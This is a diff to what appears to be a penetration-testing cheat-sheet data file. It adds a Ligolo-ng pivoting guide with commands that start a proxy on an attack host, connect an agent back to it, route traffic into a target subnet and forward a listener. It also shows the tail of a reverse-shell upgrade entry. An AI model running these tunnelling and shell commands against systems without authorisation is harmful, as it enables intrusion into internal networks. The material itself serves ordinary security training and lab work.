@@ -72,5 +72,28 @@ script /dev/null -c /bin/bash
 # CTRL+Z to background the shell and return to your terminal 
 stty raw -echo;fg 
 `
+    },
+    {
+        id: 'ligolo',
+        name: 'Ligolo',
+        category: 'GUIDE',
+        subcategory: 'Pivoting',
+        desc: 'Using Ligolo for network pivoting.',
+        content: `# Start Ligolo-ng Proxy on Attack Host
+sudo ./proxy -selfcert -laddr 0.0.0.0:443
+ligolo-ng >> interface_create --name "ligolo"
+
+# Connect Ligolo-ng Agent to Attacker Host
+./agent -connect <PROXY_IP>:443 -ignore-cert 
+
+# Attack Operations: Route, Port Forward, and Start Tunnel
+ligolo-ng >> session
+ligolo-ng >> tunnel_start --tun ligolo
+ligolo-ng >> interface_add_route --name ligolo --route <TARGET_SUBNET>
+ligolo-ng >> listener_add --addr 0.0.0.0:1234 --to 10.10.14.12:4321 --tcp     
+
+# 240.0.0.1/32    when need to use pivot machine localhost use this address             
+# note: start the tunnel before adding route to avoid error 
+`
     }
 ];
